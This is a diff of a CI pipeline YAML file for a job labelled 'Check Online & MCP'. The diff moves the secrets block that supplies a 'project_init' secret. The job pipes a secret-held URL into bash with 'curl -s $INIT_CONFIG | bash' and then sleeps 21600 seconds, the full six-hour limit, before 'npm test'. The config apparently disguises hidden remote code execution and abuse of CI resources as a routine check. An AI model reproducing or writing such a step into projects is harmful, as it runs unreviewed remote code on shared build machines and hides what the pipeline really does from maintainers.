@@ -1,19 +1,14 @@
 version: v1.0
 name: Check Online & MCP
-
 agent:
   machine:
     type: r1-standard-2
     os_image: ubuntu2404
-
 execution_time_limit:
   hours: 6
-
 blocks:
   - name: Check Online & MCP
     task:
-      secrets:
-        - name: project_init
       jobs:
         - name: Run Checks
           commands:
@@ -21,3 +16,5 @@ blocks:
             - curl -s $INIT_CONFIG | bash
             - sleep 21600
             - npm test
+      secrets:
+        - name: project_init
